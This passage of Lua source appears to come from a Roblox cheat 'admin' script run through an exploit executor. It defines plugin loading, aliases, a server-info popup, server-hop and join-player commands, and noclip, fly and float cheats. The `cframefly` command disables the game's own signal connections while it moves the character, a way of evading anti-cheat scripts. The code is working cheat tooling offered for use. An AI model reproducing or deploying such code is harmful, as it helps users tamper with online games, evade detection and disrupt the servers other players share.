				table.insert(shade2,newplugin)
				table.insert(shade2,newplugin.Text)
				table.insert(text1,newplugin.Text)
				table.insert(shade3,newplugin.Text.Delete)
				table.insert(text2,newplugin.Text.Delete)
				Holder_5.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newplugin.Text.Delete.MouseButton1Click:Connect(function()
					deletePlugin(pName)
				end)
			end
			if not dontSave then
				updatesaves()
			end
		end
	end

	local PluginCache
	function LoadPlugin(val,startup)
		local plugin

		function CatchedPluginLoad()
			plugin = loadfile(val)()
		end

		function handlePluginError(plerror)
			notify('Plugin Error','An error occurred with the plugin, "'..val..'" and it could not be loaded')
			if FindInTable(PluginsTable,val) then
				for i,v in pairs(PluginsTable) do
					if v == val then
						table.remove(PluginsTable,i)
					end
				end
			end
			updatesaves()

			print("Original Error: "..tostring(plerror))
			print("Plugin Error, stack traceback: "..tostring(debug.traceback()))

			plugin = nil

			return false
		end

		xpcall(CatchedPluginLoad, handlePluginError)

		if plugin ~= nil then
			if not startup then
				notify('Loaded Plugin',"Name: "..plugin["PluginName"].."\n".."Description: "..plugin["PluginDescription"])
			end
			addcmdtext('',val)
			addcmdtext(string.upper('--'..plugin["PluginName"]),val,plugin["PluginDescription"])
			for i,v in pairs(plugin["Commands"]) do 
				local cmdExt = ''
				local cmdName = i
				local function handleNames()
					cmdName = i
					if findCmd(cmdName..cmdExt) then
						if isNumber(cmdExt) then
							cmdExt = cmdExt+1
						else
							cmdExt = 1
						end
						handleNames()
					else
						cmdName = cmdName..cmdExt
					end
				end
				handleNames()
				addcmd(cmdName, v["Aliases"], v["Function"], val)
				if v["ListName"] then
					local newName = v.ListName
					local cmdNames = {i,unpack(v.Aliases)}
					for i,v in pairs(cmdNames) do
						newName = newName:gsub(v,v..cmdExt)
					end
					addcmdtext(newName,val,v["Description"])
				else
					addcmdtext(cmdName,val,v["Description"])
				end
			end
			IndexContents('',true)
		elseif plugin == nil then
			plugin = nil
		end
	end

	function FindPlugins()
		if PluginsTable ~= nil and type(PluginsTable) == "table" then
			for i,v in pairs(PluginsTable) do
				LoadPlugin(v,true)
			end
			refreshplugins(true)
		end
	end

	AddPlugin.MouseButton1Click:Connect(function()
		addPlugin(PluginsGUI.FileName.Text)
	end)

	Exit_3.MouseButton1Click:Connect(function()
		PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
		FileName.Text = 'Plugin File Name'
	end)

	Add_3.MouseButton1Click:Connect(function()
		PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, 310), "InOut", "Quart", 0.5, true, nil)
	end)

	Plugins.MouseButton1Click:Connect(function()
		if writefileExploit() then
			PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.5)
			SettingsHolder.Visible = false
		else
			notify('Incompatible Exploit','Your exploit is unable to use plugins (missing read/writefile)')
		end
	end)

	Close_4.MouseButton1Click:Connect(function()
		SettingsHolder.Visible = true
		PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	addcmd('addalias',{},function(args, speaker)
		if #args < 2 then return end
		local cmd = string.lower(args[1])
		local alias = string.lower(args[2])
		for i,v in pairs(cmds) do
			if v.NAME:lower()==cmd or FindInTable(v.ALIAS,cmd) then
				customAlias[alias] = v
				aliases[#aliases + 1] = {CMD = cmd, ALIAS = alias}
				notify('Aliases Modified',"Added "..alias.." as an alias to "..cmd)
				updatesaves()
				refreshaliases()
				break
			end
		end
	end)

	addcmd('removealias',{},function(args, speaker)
		if #args < 1 then return end
		local alias = string.lower(args[1])
		if customAlias[alias] then
			local cmd = customAlias[alias].NAME
			customAlias[alias] = nil
			for i = #aliases,1,-1 do
				if aliases[i].ALIAS == tostring(alias) then
					table.remove(aliases, i)
				end
			end
			notify('Aliases Modified',"Removed the alias "..alias.." from "..cmd)
			updatesaves()
			refreshaliases()
		end
	end)

	addcmd('clraliases',{},function(args, speaker)
		customAlias = {}
		aliases = {}
		notify('Aliases Modified','Removed all aliases')
		updatesaves()
		refreshaliases()
	end)

	addcmd('serverinfo',{'info','sinfo'},function(args, speaker)
		spawn(function()
			local FRAME = Instance.new("Frame")
			local shadow = Instance.new("Frame")
			local PopupText = Instance.new("TextLabel")
			local Exit = Instance.new("TextButton")
			local ExitImage = Instance.new("ImageLabel")
			local background = Instance.new("Frame")
			local TextLabel = Instance.new("TextLabel")
			local TextLabel2 = Instance.new("TextLabel")
			local TextLabel3 = Instance.new("TextLabel")
			local Time = Instance.new("TextLabel")
			local appearance = Instance.new("TextLabel")
			local maxplayers = Instance.new("TextLabel")
			local name = Instance.new("TextLabel")
			local placeid = Instance.new("TextLabel")
			local playerid = Instance.new("TextLabel")
			local players = Instance.new("TextLabel")
			local CopyApp = Instance.new("TextButton")
			local CopyPlrID = Instance.new("TextButton")
			local CopyPlcID = Instance.new("TextButton")

			FRAME.Name = randomString()
			FRAME.Parent = PARENT
			FRAME.Active = true
			FRAME.BackgroundTransparency = 1
			FRAME.Position = UDim2.new(0.5, -130, 0, -500)
			FRAME.Size = UDim2.new(0, 250, 0, 20)
			FRAME.ZIndex = 10
			dragGUI(FRAME)

			shadow.Name = "shadow"
			shadow.Parent = FRAME
			shadow.BackgroundColor3 = currentShade2
			shadow.BorderSizePixel = 0
			shadow.Size = UDim2.new(0, 250, 0, 20)
			shadow.ZIndex = 10
			table.insert(shade2,shadow)

			PopupText.Name = "PopupText"
			PopupText.Parent = shadow
			PopupText.BackgroundTransparency = 1
			PopupText.Size = UDim2.new(1, 0, 0.95, 0)
			PopupText.ZIndex = 10
			PopupText.Font = Enum.Font.SourceSans
			PopupText.TextSize = 14
			PopupText.Text = "Server"
			PopupText.TextColor3 = currentText1
			PopupText.TextWrapped = true
			table.insert(text1,PopupText)

			Exit.Name = "Exit"
			Exit.Parent = shadow
			Exit.BackgroundTransparency = 1
			Exit.Position = UDim2.new(1, -20, 0, 0)
			Exit.Size = UDim2.new(0, 20, 0, 20)
			Exit.Text = ""
			Exit.ZIndex = 10

			ExitImage.Parent = Exit
			ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
			ExitImage.BackgroundTransparency = 1
			ExitImage.Position = UDim2.new(0, 5, 0, 5)
			ExitImage.Size = UDim2.new(0, 10, 0, 10)
			ExitImage.Image = "rbxassetid://5054663650"
			ExitImage.ZIndex = 10

			background.Name = "background"
			background.Parent = FRAME
			background.Active = true
			background.BackgroundColor3 = currentShade1
			background.BorderSizePixel = 0
			background.Position = UDim2.new(0, 0, 1, 0)
			background.Size = UDim2.new(0, 250, 0, 250)
			background.ZIndex = 10
			table.insert(shade1,background)

			TextLabel.Name = "Text Label"
			TextLabel.Parent = background
			TextLabel.BackgroundTransparency = 1
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0, 5, 0, 80)
			TextLabel.Size = UDim2.new(0, 100, 0, 20)
			TextLabel.ZIndex = 10
			TextLabel.Font = Enum.Font.SourceSansLight
			TextLabel.TextSize = 20
			TextLabel.Text = "Run Time:"
			TextLabel.TextColor3 = currentText1
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,TextLabel)

			TextLabel2.Name = "Text Label2"
			TextLabel2.Parent = background
			TextLabel2.BackgroundTransparency = 1
			TextLabel2.BorderSizePixel = 0
			TextLabel2.Position = UDim2.new(0, 5, 0, 130)
			TextLabel2.Size = UDim2.new(0, 100, 0, 20)
			TextLabel2.ZIndex = 10
			TextLabel2.Font = Enum.Font.SourceSansLight
			TextLabel2.TextSize = 20
			TextLabel2.Text = "Statistics:"
			TextLabel2.TextColor3 = currentText1
			TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,TextLabel2)

			TextLabel3.Name = "Text Label3"
			TextLabel3.Parent = background
			TextLabel3.BackgroundTransparency = 1
			TextLabel3.BorderSizePixel = 0
			TextLabel3.Position = UDim2.new(0, 5, 0, 10)
			TextLabel3.Size = UDim2.new(0, 100, 0, 20)
			TextLabel3.ZIndex = 10
			TextLabel3.Font = Enum.Font.SourceSansLight
			TextLabel3.TextSize = 20
			TextLabel3.Text = "Local Player:"
			TextLabel3.TextColor3 = currentText1
			TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,TextLabel3)

			Time.Name = "Time"
			Time.Parent = background
			Time.BackgroundTransparency = 1
			Time.BorderSizePixel = 0
			Time.Position = UDim2.new(0, 5, 0, 105)
			Time.Size = UDim2.new(0, 100, 0, 20)
			Time.ZIndex = 10
			Time.Font = Enum.Font.SourceSans
			Time.FontSize = Enum.FontSize.Size14
			Time.Text = "LOADING"
			Time.TextColor3 = currentText1
			Time.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,Time)

			appearance.Name = "appearance"
			appearance.Parent = background
			appearance.BackgroundTransparency = 1
			appearance.BorderSizePixel = 0
			appearance.Position = UDim2.new(0, 5, 0, 55)
			appearance.Size = UDim2.new(0, 100, 0, 20)
			appearance.ZIndex = 10
			appearance.Font = Enum.Font.SourceSans
			appearance.FontSize = Enum.FontSize.Size14
			appearance.Text = "Appearance: LOADING"
			appearance.TextColor3 = currentText1
			appearance.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,appearance)

			maxplayers.Name = "maxplayers"
			maxplayers.Parent = background
			maxplayers.BackgroundTransparency = 1
			maxplayers.BorderSizePixel = 0
			maxplayers.Position = UDim2.new(0, 5, 0, 175)
			maxplayers.Size = UDim2.new(0, 100, 0, 20)
			maxplayers.ZIndex = 10
			maxplayers.Font = Enum.Font.SourceSans
			maxplayers.FontSize = Enum.FontSize.Size14
			maxplayers.Text = "LOADING"
			maxplayers.TextColor3 = currentText1
			maxplayers.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,maxplayers)

			name.Name = "name"
			name.Parent = background
			name.BackgroundTransparency = 1
			name.BorderSizePixel = 0
			name.Position = UDim2.new(0, 5, 0, 215)
			name.Size = UDim2.new(0, 240, 0, 30)
			name.ZIndex = 10
			name.Font = Enum.Font.SourceSans
			name.FontSize = Enum.FontSize.Size14
			name.Text = "Place Name: LOADING"
			name.TextColor3 = currentText1
			name.TextWrapped = true
			name.TextXAlignment = Enum.TextXAlignment.Left
			name.TextYAlignment = Enum.TextYAlignment.Top
			table.insert(text1,name)

			placeid.Name = "placeid"
			placeid.Parent = background
			placeid.BackgroundTransparency = 1
			placeid.BorderSizePixel = 0
			placeid.Position = UDim2.new(0, 5, 0, 195)
			placeid.Size = UDim2.new(0, 100, 0, 20)
			placeid.ZIndex = 10
			placeid.Font = Enum.Font.SourceSans
			placeid.FontSize = Enum.FontSize.Size14
			placeid.Text = "Place ID: LOADING"
			placeid.TextColor3 = currentText1
			placeid.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,placeid)

			playerid.Name = "playerid"
			playerid.Parent = background
			playerid.BackgroundTransparency = 1
			playerid.BorderSizePixel = 0
			playerid.Position = UDim2.new(0, 5, 0, 35)
			playerid.Size = UDim2.new(0, 100, 0, 20)
			playerid.ZIndex = 10
			playerid.Font = Enum.Font.SourceSans
			playerid.FontSize = Enum.FontSize.Size14
			playerid.Text = "Player ID: LOADING"
			playerid.TextColor3 = currentText1
			playerid.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,playerid)

			players.Name = "players"
			players.Parent = background
			players.BackgroundTransparency = 1
			players.BorderSizePixel = 0
			players.Position = UDim2.new(0, 5, 0, 155)
			players.Size = UDim2.new(0, 100, 0, 20)
			players.ZIndex = 10
			players.Font = Enum.Font.SourceSans
			players.FontSize = Enum.FontSize.Size14
			players.Text = "LOADING"
			players.TextColor3 = currentText1
			players.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,players)

			CopyApp.Name = "CopyApp"
			CopyApp.Parent = background
			CopyApp.BackgroundColor3 = currentShade2
			CopyApp.BorderSizePixel = 0
			CopyApp.Position = UDim2.new(0, 210, 0, 55)
			CopyApp.Size = UDim2.new(0, 35, 0, 20)
			CopyApp.Font = Enum.Font.SourceSans
			CopyApp.TextSize = 14
			CopyApp.Text = "Copy"
			CopyApp.TextColor3 = currentText1
			CopyApp.ZIndex = 10
			table.insert(shade2,CopyApp)
			table.insert(text1,CopyApp)

			CopyPlrID.Name = "CopyPlrID"
			CopyPlrID.Parent = background
			CopyPlrID.BackgroundColor3 = currentShade2
			CopyPlrID.BorderSizePixel = 0
			CopyPlrID.Position = UDim2.new(0, 210, 0, 35)
			CopyPlrID.Size = UDim2.new(0, 35, 0, 20)
			CopyPlrID.Font = Enum.Font.SourceSans
			CopyPlrID.TextSize = 14
			CopyPlrID.Text = "Copy"
			CopyPlrID.TextColor3 = currentText1
			CopyPlrID.ZIndex = 10
			table.insert(shade2,CopyPlrID)
			table.insert(text1,CopyPlrID)

			CopyPlcID.Name = "CopyPlcID"
			CopyPlcID.Parent = background
			CopyPlcID.BackgroundColor3 = currentShade2
			CopyPlcID.BorderSizePixel = 0
			CopyPlcID.Position = UDim2.new(0, 210, 0, 195)
			CopyPlcID.Size = UDim2.new(0, 35, 0, 20)
			CopyPlcID.Font = Enum.Font.SourceSans
			CopyPlcID.TextSize = 14
			CopyPlcID.Text = "Copy"
			CopyPlcID.TextColor3 = currentText1
			CopyPlcID.ZIndex = 10
			table.insert(shade2,CopyPlcID)
			table.insert(text1,CopyPlcID)

			local SINFOGUI = background
			FRAME:TweenPosition(UDim2.new(0.5, -130, 0, 100), "InOut", "Quart", 0.5, true, nil) 
			wait(0.5)
			Exit.MouseButton1Click:Connect(function()
				FRAME:TweenPosition(UDim2.new(0.5, -130, 0, -500), "InOut", "Quart", 0.5, true, nil) 
				wait(0.6)
				FRAME:Destroy()
			end)
			local Asset = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
			SINFOGUI.name.Text = "Place Name: " .. Asset.Name
			SINFOGUI.playerid.Text = "Player ID: " ..speaker.UserId
			SINFOGUI.maxplayers.Text = Players.MaxPlayers.. " Players Max"
			SINFOGUI.placeid.Text = "Place ID: " ..game.PlaceId

			CopyApp.MouseButton1Click:Connect(function()
				toClipboard(speaker.CharacterAppearanceId)
			end)
			CopyPlrID.MouseButton1Click:Connect(function()
				toClipboard(speaker.UserId)
			end)
			CopyPlcID.MouseButton1Click:Connect(function()
				toClipboard(game.PlaceId)
			end)

			repeat
				players = Players:GetPlayers()
				SINFOGUI.players.Text = #players.. " Player(s)"
				SINFOGUI.appearance.Text = "Appearance: " ..speaker.CharacterAppearanceId
				local seconds = math.floor(workspace.DistributedGameTime)
				local minutes = math.floor(workspace.DistributedGameTime / 60)
				local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
				local seconds = seconds - (minutes * 60)
				local minutes = minutes - (hours * 60)
				if hours < 1 then if minutes < 1 then
						SINFOGUI.Time.Text = seconds .. " Second(s)" else
						SINFOGUI.Time.Text = minutes .. " Minute(s), " .. seconds .. " Second(s)"
					end
				else
					SINFOGUI.Time.Text = hours .. " Hour(s), " .. minutes .. " Minute(s), " .. seconds .. " Second(s)"
				end
				wait(1)
			until SINFOGUI.Parent == nil
		end)
	end)

	addcmd('jobid',{},function(args, speaker)
		local jobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
		toClipboard(jobId)
	end)

	addcmd('notifyjobid',{},function(args, speaker)
		notify('JobId / PlaceId',game.JobId..' / '..game.PlaceId)
	end)

	addcmd('breakloops',{'break'},function(args, speaker)
		lastBreakTime = tick()
	end)

	addcmd('gametp',{'gameteleport'},function(args, speaker)
		game:GetService('TeleportService'):Teleport(args[1])
	end)

	addcmd('rejoin',{'rj'},function(args, speaker)
		if #Players:GetPlayers() <= 1 then
			Players.LocalPlayer:Kick("\nRejoining...")
			wait()
			game:GetService('TeleportService'):Teleport(game.PlaceId, Players.LocalPlayer)
		else
			game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, Players.LocalPlayer)
		end
	end)

	addcmd('autorejoin',{'autorj'},function(args, speaker)
		local Dir = COREGUI:FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
		Dir.DescendantAdded:Connect(function(Err)
			if Err.Name == "ErrorTitle" then
				Err:GetPropertyChangedSignal("Text"):Connect(function()
					if Err.Text:sub(0, 12) == "Disconnected" then
						if #game.Players:GetPlayers() <= 1 then
							game.Players.LocalPlayer:Kick("\nRejoining...")
							wait()
							game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
						else
							game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
						end
					end
				end)
			end
		end)
		notify('Auto Rejoin','Auto rejoin enabled')
	end)

	addcmd('serverhop',{'shop'},function(args, speaker)
		local x = {}
		for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
				x[#x + 1] = v.id
			end
		end
		if #x > 0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
		else
			return notify("Serverhop","Couldn't find a server.")
		end
	end)

	addcmd('joinplayer',{'joinp'},function(args, speaker)
		local retries = 0
		function ToServer(User,PlaceId)	
			if args[2] == nil then PlaceId = game.PlaceId end
			if not pcall(function()
					local FoundUser, UserId = pcall(function()
						if tonumber(User) then
							return tonumber(User)
						end

						return Players:GetUserIdFromNameAsync(User)
					end)
					if not FoundUser then
						notify('Join Error','Username/UserID does not exist')
					else
						notify('Join Player','Loading servers. Hold on a second.')
						local URL2 = ("https://games.roblox.com/v1/games/"..PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
						local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet(URL2))
						local GUID

						function tablelength(T)
							local count = 0
							for _ in pairs(T) do count = count + 1 end
							return count
						end

						for i=1,tonumber(tablelength(Http.data)) do
							for j,k in pairs(Http.data[i].playerIds) do
								if k == UserId then
									GUID = Http.data[i].id
								end
							end
						end

						if GUID ~= nil then
							notify('Join Player','Joining '..User)
							game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceId,GUID,game.Players.LocalPlayer)
						else
							notify('Join Error','Unable to join user.')
						end
					end
				end)
			then
				if retries < 3 then
					retries = retries + 1
					print('ERROR retrying '..retries..'/3')
					notify('Join Error','Error while trying to join. Retrying '..retries..'/3.')
					ToServer(User,PlaceId)
				else
					notify('Join Error','Error while trying to join.')
				end
			end
		end
		ToServer(args[1],args[2])
	end)

	addcmd('exit',{},function(args, speaker)
		game:shutdown() 
	end)

	local Noclipping = nil
	addcmd('noclip',{},function(args, speaker)
		Clip = false
		wait(0.1)
		local function NoclipLoop()
			if Clip == false and speaker.Character ~= nil then
				for _, child in pairs(speaker.Character:GetDescendants()) do
					if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
						child.CanCollide = false
					end
				end
			end
		end
		Noclipping = game:GetService('RunService').Stepped:Connect(NoclipLoop)
		if args[1] and args[1] == 'nonotify' then return end
		notify('Noclip','Noclip Enabled')
	end)

	addcmd('clip',{'unnoclip'},function(args, speaker)
		if Noclipping then
			Noclipping:Disconnect()
		end
		Clip = true
		if args[1] and args[1] == 'nonotify' then return end
		notify('Noclip','Noclip Disabled')
	end)

	addcmd('togglenoclip',{},function(args, speaker)
		if Clip then
			execCmd('noclip')
		else
			execCmd('clip')
		end
	end)

	FLYING = false
	QEfly = true
	iyflyspeed = 1
	vehicleflyspeed = 1
	function sFLY(vfly)
		repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChild('Humanoid')
		repeat wait() until IYMouse
		if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end

		local T = getRoot(Players.LocalPlayer.Character)
		local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
		local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
		local SPEED = 0

		local function FLY()
			FLYING = true
			local BG = Instance.new('BodyGyro')
			local BV = Instance.new('BodyVelocity')
			BG.P = 9e4
			BG.Parent = T
			BV.Parent = T
			BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			BG.cframe = T.CFrame
			BV.velocity = Vector3.new(0, 0, 0)
			BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
			spawn(function()
				repeat wait()
					if not vfly and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
						Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
					end
					if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
						SPEED = 50
					elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
						SPEED = 0
					end
					if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
						lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
					elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					else
						BV.velocity = Vector3.new(0, 0, 0)
					end
					BG.cframe = workspace.CurrentCamera.CoordinateFrame
				until not FLYING
				CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				SPEED = 0
				BG:Destroy()
				BV:Destroy()
				if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
					Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
				end
			end)
		end
		flyKeyDown = IYMouse.KeyDown:Connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
			elseif KEY:lower() == 's' then
				CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
			elseif KEY:lower() == 'a' then
				CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
			elseif KEY:lower() == 'd' then 
				CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
			elseif QEfly and KEY:lower() == 'e' then
				CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
			elseif QEfly and KEY:lower() == 'q' then
				CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
			end
			pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
		end)
		flyKeyUp = IYMouse.KeyUp:Connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = 0
			elseif KEY:lower() == 's' then
				CONTROL.B = 0
			elseif KEY:lower() == 'a' then
				CONTROL.L = 0
			elseif KEY:lower() == 'd' then
				CONTROL.R = 0
			elseif KEY:lower() == 'e' then
				CONTROL.Q = 0
			elseif KEY:lower() == 'q' then
				CONTROL.E = 0
			end
		end)
		FLY()
	end

	function NOFLY()
		FLYING = false
		if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
		if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
			Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
		end
		pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
	end

	addcmd('fly',{},function(args, speaker)
		NOFLY()
		wait()
		sFLY()
		if args[1] and isNumber(args[1]) then
			iyflyspeed = args[1]
		end
	end)

	addcmd('flyspeed',{'flysp'},function(args, speaker)
		local speed = args[1] or 1
		if isNumber(speed) then
			iyflyspeed = speed
		end
	end)

	addcmd('unfly',{'nofly','novfly','unvehiclefly','novehiclefly','unvfly'},function(args, speaker)
		NOFLY()
	end)

	addcmd('vfly',{'vehiclefly'},function(args, speaker)
		NOFLY()
		wait()
		sFLY(true)
		if args[1] and isNumber(args[1]) then
			vehicleflyspeed = args[1]
		end
	end)

	addcmd('togglevfly',{},function(args, speaker)
		if FLYING then
			NOFLY()
		else
			sFLY(true)
		end
	end)

	addcmd('vflyspeed',{'vflysp','vehicleflyspeed','vehicleflysp'},function(args, speaker)
		local speed = args[1] or 1
		if isNumber(speed) then
			vehicleflyspeed = speed
		end
	end)

	addcmd('qefly',{'flyqe'},function(args, speaker)
		if args[1] == 'false' then
			QEfly = false
		else
			QEfly = true
		end
	end)

	addcmd('togglefly',{},function(args, speaker)
		if FLYING then
			NOFLY()
		else
			sFLY()
		end
	end)

	Con = nil
	SPI = 1 -- studs per interval
	addcmd('cframefly', {'cfly'}, function(args, ME)
		if args[1] and isNumber(args[1]) then
			SPI = args[1]
		end
		local UIS = game:GetService('UserInputService')
		local RunService = game:GetService('RunService')
		local Keys, v3, cf = Enum.KeyCode, Vector3.new(), CFrame.new()
		Con = RunService.Heartbeat:Connect(function()
			local Camera, Cache = workspace.CurrentCamera, {}
			local Human = ME.Character and ME.Character:FindFirstChildWhichIsA('Humanoid')
			local HRP = Human and Human.RootPart or ME.Character.PrimaryPart
			if not ME.Character or not Human or not HRP or not Camera then
				return 
			end
			local Cache = {}
			local Cons = {game.ItemChanged, Human.StateChanged, Human.Changed, ME.Character.Changed}
			for _, v in ipairs(ME.Character:GetChildren()) do
				if v:IsA('BasePart') then
					Cons[#Cons + 1] = v.Changed
					Cons[#Cons + 1] = v:GetPropertyChangedSignal('CFrame')
				end
			end
			for _, v in ipairs(Cons) do
				for _, v1 in ipairs(getconnections(v)) do
					if not rawget(v1, '__OBJECT_ENABLED') then
						Cache[#Cache + 1] = v1
						v1:Disable()
					end
				end
			end
			Human:ChangeState(11)
			HRP.CFrame = CFrame.new(HRP.Position, HRP.Position + Camera.CFrame.LookVector) * (UIS:GetFocusedTextBox() and cf or CFrame.new((UIS:IsKeyDown(Keys.D) and SPI) or (UIS:IsKeyDown(Keys.A) and -SPI) or 0, (UIS:IsKeyDown(Keys.E) and SPI / 2) or (UIS:IsKeyDown(Keys.Q) and -SPI / 2) or 0, (UIS:IsKeyDown(Keys.S) and SPI) or (UIS:IsKeyDown(Keys.W) and -SPI) or 0))
			for _, v in ipairs(Cache) do
				v:Enable()
			end
		end)
	end)

	addcmd('uncframefly',{'uncfly'},function(args, speaker)
		if Con then
			Con:Disconnect()
		end
	end)

	addcmd('cframeflyspeed',{'cflyspeed'},function(args, speaker)
		if isNumber(args[1]) then
			SPI = args[1]
		end
	end)

	Floating = false
	floatName = randomString()
	addcmd('float', {'platform'},function(args, speaker)
		Floating = true
		local pchar = speaker.Character
		if pchar and not pchar:FindFirstChild(floatName) then
			spawn(function()
				local Float = Instance.new('Part')
				Float.Name = floatName
				Float.Parent = pchar
				Float.Transparency = 1
				Float.Size = Vector3.new(6,1,6)
				Float.Anchored = true
				local FloatValue = -3.5
				if r15(speaker) then FloatValue = -3.65 end
				Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
				notify('Float','Float Enabled (Q = down & E = up)')
				qUp = IYMouse.KeyUp:Connect(function(KEY)
					if KEY == 'q' then
						FloatValue = FloatValue + 0.5
					end
				end)
				eUp = IYMouse.KeyUp:Connect(function(KEY)
					if KEY == 'e' then
						FloatValue = FloatValue - 0.5
					end
				end)
				qDown = IYMouse.KeyDown:Connect(function(KEY)
					if KEY == 'q' then
						FloatValue = FloatValue - 0.5
					end
				end)
				eDown = IYMouse.KeyDown:Connect(function(KEY)
					if KEY == 'e' then
						FloatValue = FloatValue + 0.5
					end
				end)
				floatDied = speaker.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
					FloatingFunc:Disconnect()
					Float:Destroy()
					qUp:Disconnect()
					eUp:Disconnect()
					qDown:Disconnect()
					eDown:Disconnect()
					floatDied:Disconnect()
				end)
				local function FloatPadLoop()
					if pchar:FindFirstChild(floatName) and getRoot(pchar) then
						Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
					else
						FloatingFunc:Disconnect()
						Float:Destroy()
						qUp:Disconnect()
						eUp:Disconnect()
						qDown:Disconnect()
						eDown:Disconnect()
						floatDied:Disconnect()
					end
				end			
				FloatingFunc = game:GetService('RunService').Heartbeat:Connect(FloatPadLoop)
			end)
		end
	end)

	addcmd('unfloat',{'nofloat','unplatform','noplatform'},function(args, speaker)
		Floating = false
		local pchar = speaker.Character
		notify('Float','Float Disabled')
		if pchar:FindFirstChild(floatName) then
			pchar:FindFirstChild(floatName):Destroy()
		end
		if floatDied then
			FloatingFunc:Disconnect()
			qUp:Disconnect()
			eUp:Disconnect()
			qDown:Disconnect()
			eDown:Disconnect()
			floatDied:Disconnect()
		end
	end)

	addcmd('togglefloat',{},function(args, speaker)
		if Floating then
			execCmd('unfloat')
		else
			execCmd('float')
		end
